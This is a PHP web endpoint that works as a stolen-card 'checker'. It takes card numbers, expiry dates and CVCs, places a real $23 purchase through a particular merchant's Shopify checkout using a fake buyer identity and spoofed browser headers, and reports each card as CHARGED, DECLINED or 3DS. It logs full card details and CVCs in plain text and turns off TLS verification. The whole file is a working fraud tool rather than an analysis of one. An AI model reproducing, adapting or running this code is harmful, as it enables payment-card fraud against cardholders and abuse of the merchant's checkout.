<?php
header('Content-Type: text/plain');

// Enable error reporting for debugging (disable in production)
ini_set('display_errors', 0);
error_reporting(E_ALL);

// Optional file-based logging for debugging (disable in production)
 $log_file = __DIR__ . '/shopify23$_debug.log';
function log_message($message) {
    global $log_file;
    file_put_contents($log_file, date('Y-m-d H:i:s') . " - $message\n", FILE_APPEND);
}

// Function to check a single card via Shopify API
function checkCard($card_number, $exp_month, $exp_year, $cvc, $retry = 1) {
    $card_details = "$card_number|$exp_month|$exp_year|$cvc";
    log_message("Checking card: $card_details");

    for ($attempt = 0; $attempt <= $retry; $attempt++) {
        try {
            // Step 1: Create a session
            $session_token = createShopifySession($card_number, $exp_month, $exp_year, $cvc);
            if (!$session_token) {
                log_message("Failed to create session for $card_details");
                return "DECLINED [Failed to create session] $card_details";
            }
            
            // Step 2: Submit for completion
            $receipt_id = submitForCompletion($session_token, $card_number, $exp_month, $exp_year, $cvc);
            if (!$receipt_id) {
                log_message("Failed to submit for completion for $card_details");
                return "DECLINED [Failed to submit for completion] $card_details";
            }
            
            // Step 3: Poll for receipt
            $result = pollForReceipt($receipt_id, $session_token);
            if (!$result) {
                log_message("Failed to get receipt for $card_details");
                return "DECLINED [Failed to get receipt] $card_details";
            }
            
            // Process the result
            $status = 'DECLINED';
            $message = 'Unknown error';
            
            if (isset($result['data']['receipt'])) {
                $receipt = $result['data']['receipt'];
                
                if (isset($receipt['__typename']) && $receipt['__typename'] === 'ProcessedReceipt') {
                    $status = 'CHARGED';
                    $message = 'Payment successfully processed';
                    
                    // Get payment details if available
                    if (isset($receipt['paymentDetails'])) {
                        $paymentDetails = $receipt['paymentDetails'];
                        if (isset($paymentDetails['paymentCardBrand'])) {
                            $message .= ' - Card: ' . $paymentDetails['paymentCardBrand'];
                        }
                        if (isset($paymentDetails['creditCardLastFourDigits'])) {
                            $message .= ' ****' . $paymentDetails['creditCardLastFourDigits'];
                        }
                        if (isset($paymentDetails['paymentAmount'])) {
                            $amount = $paymentDetails['paymentAmount'];
                            if (isset($amount['amount']) && isset($amount['currencyCode'])) {
                                $message .= ' - Amount: ' . $amount['amount'] . ' ' . $amount['currencyCode'];
                            }
                        }
                    }
                } elseif (isset($receipt['__typename']) && $receipt['__typename'] === 'FailedReceipt') {
                    $status = 'DECLINED';
                    $message = 'Payment failed';
                    
                    if (isset($receipt['processingError'])) {
                        $error = $receipt['processingError'];
                        if (isset($error['__typename'])) {
                            $errorType = $error['__typename'];
                            if ($errorType === 'PaymentFailed' && isset($error['messageUntranslated'])) {
                                $message = $error['messageUntranslated'];
                            }
                        }
                    }
                } elseif (isset($receipt['__typename']) && $receipt['__typename'] === 'ActionRequiredReceipt') {
                    $status = '3DS';
                    $message = '3D Secure authentication required';
                }
            }
            
            $response_msg = htmlspecialchars($message, ENT_QUOTES, 'UTF-8');
            log_message("$status for $card_details: $response_msg");
            return "$status [$response_msg] $card_details";
            
        } catch (Exception $e) {
            log_message("Exception on attempt " . ($attempt + 1) . " for $card_details: " . $e->getMessage());
            if ($attempt < $retry) {
                sleep(2); // Wait before retry
                continue;
            }
            return "DECLINED [Exception: " . $e->getMessage() . "] $card_details";
        }
    }

    log_message("Failed after retries for $card_details");
    return "DECLINED [API request failed after retries] $card_details";
}

// Function to create a Shopify session
function createShopifySession($card_number, $exp_month, $exp_year, $cvc) {
    $url = 'https://checkout.pci.shopifyinc.com/sessions';
    
    $headers = [
        'accept: application/json',
        'accept-language: en-US,en;q=0.9',
        'content-type: application/json',
        'origin: https://checkout.pci.shopifyinc.com',
        'priority: u=1, i',
        'referer: https://checkout.pci.shopifyinc.com/build/102f5ed/number-ltr.html?identifier=&locationURL=&localFonts[]=%7B%22name%22%3A%22Lato%22%2C%22source%22%3A%22local(%27Lato%20Regular%27)%2C%20local(%27Lato-Regular%27)%2Curl(https%3A%2F%2Ffonts.shopifycdn.com%2Flato%2Flato_n4.c3b93d431f0091c8be23185e15c9d1fee1e971c5.woff2%3Fvalid_until%3DMTc1Mzg2MTg5Ng%26hmac%3Dc95fc2c7a817392abba851cc430429100da8cbcd76b814750792c595b9789084)%20format(%27woff2%27)%2Curl(https%3A%2F%2Ffonts.shopifycdn.com%2Flato%2Flato_n4.d5c00c781efb195594fd2fd4ad04f7882949e327.woff%3Fvalid_until%3DMTc1Mzg2MTg5Ng%26hmac%3Ddfd4096831f7204e44b129f6061f17ee921f43021a25b23b3130d65d230953b6)%20format(%27woff%27)%22%7D&localFonts[]=%7B%22name%22%3A%22Lato%22%2C%22source%22%3A%22local(%27Lato%20Regular%27)%2C%20local(%27Lato-Regular%27)%2Curl(https%3A%2F%2Ffonts.shopifycdn.com%2Flato%2Flato_n4.c3b93d431f0091c8be23185e15c9d1fee1e971c5.woff2%3Fvalid_until%3DMTc1Mzg2MTg5Ng%26hmac%3Dc95fc2c7a817392abba851cc430429100da8cbcd76b814750792c595b9789084)%20format(%27woff2%27)%2Curl(https%3A%2F%2Ffonts.shopifycdn.com%2Flato%2Flato_n4.d5c00c781efb195594fd2fd4ad04f7882949e327.woff%3Fvalid_until%3DMTc1Mzg2MTg5Ng%26hmac%3Ddfd4096831f7204e44b129f6061f17ee921f43021a25b23b3130d65d230953b6)%20format(%27woff%27)%22%7D',
        'sec-ch-ua: "Not)A;Brand";v="8", "Chromium";v="138", "Google Chrome";v="138"',
        'sec-ch-ua-mobile: ?0',
        'sec-ch-ua-platform: "Windows"',
        'sec-fetch-dest: empty',
        'sec-fetch-mode: cors',
        'sec-fetch-site: same-origin',
        'sec-fetch-storage-access: active',
        'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36'
    ];
    
    $data = [
        'credit_card' => [
            'number' => $card_number,
            'month' => (int)$exp_month,
            'year' => (int)$exp_year,
            'verification_value' => $cvc,
            'start_month' => null,
            'start_year' => null,
            'issue_number' => '',
            'name' => 'Darkboy'
        ],
        'payment_session_scope' => 'vanguardmil.com'
    ];
    
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($data));
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    curl_setopt($ch, CURLOPT_TIMEOUT, 30);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    
    $response = curl_exec($ch);
    $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    $curl_error = curl_error($ch);
    curl_close($ch);
    
    if ($curl_error || $http_code !== 200) {
        log_message("Session creation failed: HTTP $http_code, Error: $curl_error, Response: " . substr($response, 0, 200));
        return false;
    }
    
    $result = json_decode($response, true);
    if (json_last_error() !== JSON_ERROR_NONE || !isset($result['id'])) {
        log_message("Invalid session response: " . substr($response, 0, 200));
        return false;
    }
    
    return $result['id'];
}

// Function to submit for completion
function submitForCompletion($session_token, $card_number, $exp_month, $exp_year, $cvc) {
    $url = 'https://www.vanguardmil.com/checkouts/unstable/graphql?operationName=SubmitForCompletion';
    
    $headers = [
        'accept: application/json',
        'accept-language: en-US',
        'content-type: application/json',
        'origin: https://www.vanguardmil.com',
        'priority: u=1, i',
        'referer: https://www.vanguardmil.com/',
        'sec-ch-ua: "Not)A;Brand";v="8", "Chromium";v="138", "Google Chrome";v="138"',
        'sec-ch-ua-mobile: ?0',
        'sec-ch-ua-platform: "Windows"',
        'sec-fetch-dest: empty',
        'sec-fetch-mode: cors',
        'sec-fetch-site: same-origin',
        'shopify-checkout-client: checkout-web/1.0',
        'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36',
        'x-checkout-one-session-token: ' . $session_token,
        'x-checkout-web-build-id: 1425498c9f082684649666eafda564f07561d25c',
        'x-checkout-web-deploy-stage: production',
        'x-checkout-web-server-handling: fast',
        'x-checkout-web-server-rendering: yes',
        'x-checkout-web-source-id: hWN1DD0iR9Rfnqmheh7rVKMb'
    ];
    
    // Generate a unique ID for this request
    $unique_id = uniqid() . '-' . rand(1000, 9999);
    
    $data = [
        'query' => 'mutation SubmitForCompletion($input:NegotiationInput!,$attemptToken:String!,$metafields:[MetafieldInput!],$postPurchaseInquiryResult:PostPurchaseInquiryResultCode,$analytics:AnalyticsInput){submitForCompletion(input:$input attemptToken:$attemptToken metafields:$metafields postPurchaseInquiryResult:$postPurchaseInquiryResult analytics:$analytics){__typename ...on SubmitSuccess{receipt{id __typename}__typename}...on SubmitFailed{reason __typename}...on SubmitRejected{errors{__typename ...on NegotiationError{code __typename}__typename}__typename}__typename}}',
        'variables' => [
            'input' => [
                'sessionInput' => [
                    'sessionToken' => $session_token
                ],
                'queueToken' => 'A0BuViNF5uWuojW64-m4dv3G7CbZ8SY9ekvTyHZLbEUgccVE8Hqv2x3N6_xX_gez1xCHNoNlHmMlGZz6Z0KiJvSEZb23F7EG3xsHLyBc-1x2A_My',
                'discounts' => [
                    'lines' => [],
                    'acceptUnexpectedDiscounts' => true
                ],
                'delivery' => [
                    'deliveryLines' => [
                        [
                            'destination' => [
                                'streetAddress' => [
                                    'address1' => 'New York',
                                    'address2' => 'New York',
                                    'city' => 'New York',
                                    'countryCode' => 'US',
                                    'postalCode' => '10200',
                                    'firstName' => 'Dark',
                                    'lastName' => 'Boy',
                                    'zoneCode' => 'NY',
                                    'phone' => '9685698569',
                                    'oneTimeUse' => false
                                ]
                            ],
                            'selectedDeliveryStrategy' => [
                                'deliveryStrategyByHandle' => [
                                    'handle' => '84b346bc8248a38a15eb63cb0acbfaf5-637d968cc49b21b877b3f8441beae1e1',
                                    'customDeliveryRate' => false
                                ],
                                'options' => [
                                    'phone' => '9685698569'
                                ]
                            ],
                            'targetMerchandiseLines' => [
                                'lines' => [
                                    [
                                        'stableId' => $unique_id . '-line'
                                    ]
                                ]
                            ],
                            'deliveryMethodTypes' => [
                                'SHIPPING'
                            ],
                            'expectedTotalPrice' => [
                                'value' => [
                                    'amount' => '23.00',
                                    'currencyCode' => 'USD'
                                ]
                            ],
                            'destinationChanged' => false
                        ]
                    ],
                    'noDeliveryRequired' => [],
                    'useProgressiveRates' => false,
                    'prefetchShippingRatesStrategy' => null,
                    'supportsSplitShipping' => true
                ],
                'deliveryExpectations' => [
                    'deliveryExpectationLines' => []
                ],
                'merchandise' => [
                    'merchandiseLines' => [
                        [
                            'stableId' => $unique_id . '-merchandise',
                            'merchandise' => [
                                'productVariantReference' => [
                                    'id' => 'gid://shopify/ProductVariantMerchandise/12379973845046',
                                    'variantId' => 'gid://shopify/ProductVariant/12379973845046',
                                    'properties' => [],
                                    'sellingPlanId' => null,
                                    'sellingPlanDigest' => null
                                ]
                            ],
                            'quantity' => [
                                'items' => [
                                    'value' => 1
                                ]
                            ],
                            'expectedTotalPrice' => [
                                'value' => [
                                    'amount' => '23.00',
                                    'currencyCode' => 'USD'
                                ]
                            ],
                            'lineComponentsSource' => null,
                            'lineComponents' => []
                        ]
                    ]
                ],
                'memberships' => [
                    'memberships' => []
                ],
                'payment' => [
                    'totalAmount' => [
                        'any' => true
                    ],
                    'paymentLines' => [
                        [
                            'paymentMethod' => [
                                'directPaymentMethod' => [
                                    'paymentMethodIdentifier' => 'c0a70d7e63ffa84b8b32deb8d72a686f',
                                    'sessionId' => 'west-bd6eca1c027ee66479ac2284d5e70eaa',
                                    'billingAddress' => [
                                        'streetAddress' => [
                                            'address1' => 'New York',
                                            'address2' => 'New York',
                                            'city' => 'New York',
                                            'countryCode' => 'US',
                                            'postalCode' => '10200',
                                            'firstName' => 'Dark',
                                            'lastName' => 'Boy',
                                            'zoneCode' => 'NY',
                                            'phone' => '9685698569'
                                        ]
                                    ],
                                    'cardSource' => null
                                ]
                            ],
                            'amount' => [
                                'value' => [
                                    'amount' => '23.00',
                                    'currencyCode' => 'USD'
                                ]
                            ]
                        ]
                    ],
                    'billingAddress' => [
                        'streetAddress' => [
                            'address1' => 'New York',
                            'address2' => 'New York',
                            'city' => 'New York',
                            'countryCode' => 'US',
                            'postalCode' => '10200',
                            'firstName' => 'Dark',
                            'lastName' => 'Boy',
                            'zoneCode' => 'NY',
                            'phone' => '9685698569'
                        ]
                    ]
                ],
                'buyerIdentity' => [
                    'customer' => [
                        'presentmentCurrency' => 'USD',
                        'countryCode' => 'IN'
                    ],
                    'email' => 'kjbksefb@gmail.com',
                    'emailChanged' => false,
                    'phoneCountryCode' => 'IN',
                    'marketingConsent' => [],
                    'shopPayOptInPhone' => [
                        'number' => '9685698569',
                        'countryCode' => 'IN'
                    ],
                    'rememberMe' => false
                ],
                'tip' => [
                    'tipLines' => []
                ],
                'taxes' => [
                    'proposedAllocations' => null,
                    'proposedTotalAmount' => [
                        'value' => [
                            'amount' => '0',
                            'currencyCode' => 'USD'
                        ]
                    ],
                    'proposedTotalIncludedAmount' => null,
                    'proposedMixedStateTotalAmount' => null,
                    'proposedExemptions' => []
                ],
                'note' => [
                    'message' => null,
                    'customAttributes' => []
                ],
                'localizationExtension' => [
                    'fields' => []
                ],
                'nonNegotiableTerms' => null,
                'scriptFingerprint' => [
                    'signature' => null,
                    'signatureUuid' => null,
                    'lineItemScriptChanges' => [],
                    'paymentScriptChanges' => [],
                    'shippingScriptChanges' => []
                ],
                'optionalDuties' => [
                    'buyerRefusesDuties' => false
                ],
                'cartMetafields' => []
            ],
            'attemptToken' => 'hWN1DD0iR9Rfnqmheh7rVKMb-rjza6xfief',
            'metafields' => [
                [
                    'key' => 'views',
                    'namespace' => 'checkoutblocks',
                    'value' => '{"blocks":["68701fd10734c931da8bd522","669808171ccb91cf0ee2a23c"]}',
                    'valueType' => 'JSON_STRING',
                    'appId' => 'gid://shopify/App/4748640257'
                ]
            ],
            'analytics' => [
                'requestUrl' => 'https://www.vanguardmil.com/checkouts/cn/hWN1DD0iR9Rfnqmheh7rVKMb?cart_link_id=LT5dG7f5',
                'pageId' => '5a2703f8-ACE1-4B21-3F97-0BECB1D8D8C1'
            ]
        ],
        'operationName' => 'SubmitForCompletion'
    ];
    
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($data));
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    curl_setopt($ch, CURLOPT_TIMEOUT, 30);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    
    $response = curl_exec($ch);
    $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    $curl_error = curl_error($ch);
    curl_close($ch);
    
    if ($curl_error || $http_code !== 200) {
        log_message("Submit for completion failed: HTTP $http_code, Error: $curl_error, Response: " . substr($response, 0, 500));
        return false;
    }
    
    $result = json_decode($response, true);
    if (json_last_error() !== JSON_ERROR_NONE || !isset($result['data']['submitForCompletion'])) {
        log_message("Invalid submit for completion response: " . substr($response, 0, 500));
        return false;
    }
    
    $submitResult = $result['data']['submitForCompletion'];
    if (isset($submitResult['__typename']) && $submitResult['__typename'] === 'SubmitSuccess') {
        return $submitResult['receipt']['id'];
    }
    
    // Log the specific error reason if available
    if (isset($submitResult['__typename']) && $submitResult['__typename'] === 'SubmitFailed' && isset($submitResult['reason'])) {
        log_message("Submit failed with reason: " . $submitResult['reason']);
    }
    
    return false;
}

// Function to poll for receipt
function pollForReceipt($receipt_id, $session_token) {
    $url = 'https://www.vanguardmil.com/checkouts/unstable/graphql?operationName=PollForReceipt';
    
    $headers = [
        'accept: application/json',
        'accept-language: en-US',
        'content-type: application/json',
        'origin: https://www.vanguardmil.com',
        'priority: u=1, i',
        'referer: https://www.vanguardmil.com/',
        'sec-ch-ua: "Not)A;Brand";v="8", "Chromium";v="138", "Google Chrome";v="138"',
        'sec-ch-ua-mobile: ?0',
        'sec-ch-ua-platform: "Windows"',
        'sec-fetch-dest: empty',
        'sec-fetch-mode: cors',
        'sec-fetch-site: same-origin',
        'shopify-checkout-client: checkout-web/1.0',
        'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36',
        'x-checkout-one-session-token: ' . $session_token,
        'x-checkout-web-build-id: 1425498c9f082684649666eafda564f07561d25c',
        'x-checkout-web-deploy-stage: production',
        'x-checkout-web-server-handling: fast',
        'x-checkout-web-server-rendering: yes',
        'x-checkout-web-source-id: hWN1DD0iR9Rfnqmheh7rVKMb'
    ];
    
    $data = [
        'query' => 'query PollForReceipt($receiptId:ID!,$sessionToken:String!){receipt(receiptId:$receiptId,sessionInput:{sessionToken:$sessionToken}){__typename ...on ProcessedReceipt{id __typename paymentDetails{paymentCardBrand creditCardLastFourDigits paymentAmount{amount currencyCode __typename}__typename}__typename}...on FailedReceipt{id processingError{__typename ...on PaymentFailed{messageUntranslated __typename}__typename}__typename}__typename}...on ActionRequiredReceipt{id __typename}__typename}}',
        'variables' => [
            'receiptId' => $receipt_id,
            'sessionToken' => $session_token
        ],
        'operationName' => 'PollForReceipt'
    ];
    
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($data));
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    curl_setopt($ch, CURLOPT_TIMEOUT, 30);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    
    $response = curl_exec($ch);
    $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    $curl_error = curl_error($ch);
    curl_close($ch);
    
    if ($curl_error || $http_code !== 200) {
        log_message("Poll for receipt failed: HTTP $http_code, Error: $curl_error, Response: " . substr($response, 0, 500));
        return false;
    }
    
    $result = json_decode($response, true);
    if (json_last_error() !== JSON_ERROR_NONE) {
        log_message("Invalid poll for receipt response: " . substr($response, 0, 500));
        return false;
    }
    
    return $result;
}

// Check if the request is POST and contains card data
if ($_SERVER['REQUEST_METHOD'] !== 'POST' || !isset($_POST['card'])) {
    log_message("Invalid request or missing card data");
    echo "DECLINED [Invalid request or missing card data]";
    exit;
}

// Handle single card
if (is_array($_POST['card']) && isset($_POST['card']['number'])) {
    $card = $_POST['card'];
    $required_fields = ['number', 'exp_month', 'exp_year', 'cvc'];

    // Validate card data
    foreach ($required_fields as $field) {
        if (empty($card[$field])) {
            log_message("Missing $field");
            echo "DECLINED [Missing $field]";
            exit;
        }
    }

    // Sanitize inputs
    $card_number = preg_replace('/[^0-9]/', '', $card['number']);
    $exp_month_raw = preg_replace('/[^0-9]/', '', $card['exp_month']);
    $exp_year_raw = preg_replace('/[^0-9]/', '', $card['exp_year']);
    $cvc = preg_replace('/[^0-9]/', '', $card['cvc']);

    // Normalize exp_month to 2 digits
    $exp_month = str_pad($exp_month_raw, 2, '0', STR_PAD_LEFT);
    if (!preg_match('/^(0[1-9]|1[0-2])$/', $exp_month)) {
        log_message("Invalid exp_month format: $exp_month_raw");
        echo "DECLINED [Invalid exp_month format]";
        exit;
    }

    // Normalize exp_year to 4 digits (full support for YY or YYYY)
    if (strlen($exp_year_raw) == 2) {
        $current_year = (int) date('y');
        $current_century = (int) (date('Y') - $current_year);
        $card_year = (int) $exp_year_raw;
        $exp_year = ($card_year >= $current_year ? $current_century : $current_century + 100) + $card_year;
    } elseif (strlen($exp_year_raw) == 4) {
        $exp_year = (int) $exp_year_raw;
    } else {
        log_message("Invalid exp_year format: $exp_year_raw");
        echo "DECLINED [Invalid exp_year format - must be YY or YYYY]";
        exit;
    }

    // Validate card number, year, and CVC
    if (!preg_match('/^\d{13,19}$/', $card_number)) {
        log_message("Invalid card number format: $card_number");
        echo "DECLINED [Invalid card number format]";
        exit;
    }
    if (!preg_match('/^\d{4}$/', (string) $exp_year) || $exp_year > (int) date('Y') + 10) {
        log_message("Invalid exp_year after normalization: $exp_year");
        echo "DECLINED [Invalid exp_year format or too far in future]";
        exit;
    }
    if (!preg_match('/^\d{3,4}$/', $cvc)) {
        log_message("Invalid CVC format: $cvc");
        echo "DECLINED [Invalid CVC format]";
        exit;
    }

    // Validate logical expiry
    $expiry_timestamp = strtotime("$exp_year-$exp_month-01");
    $current_timestamp = strtotime('first day of this month');
    if ($expiry_timestamp === false || $expiry_timestamp < $current_timestamp) {
        log_message("Card expired: $card_number|$exp_month|$exp_year|$cvc");
        echo "DECLINED [Card expired] $card_number|$exp_month|$exp_year|$cvc";
        exit;
    }

    // Check single card
    echo checkCard($card_number, $exp_month, $exp_year, $cvc);
} else {
    log_message("Invalid card data format");
    echo "DECLINED [Invalid card data format]";
}
?>
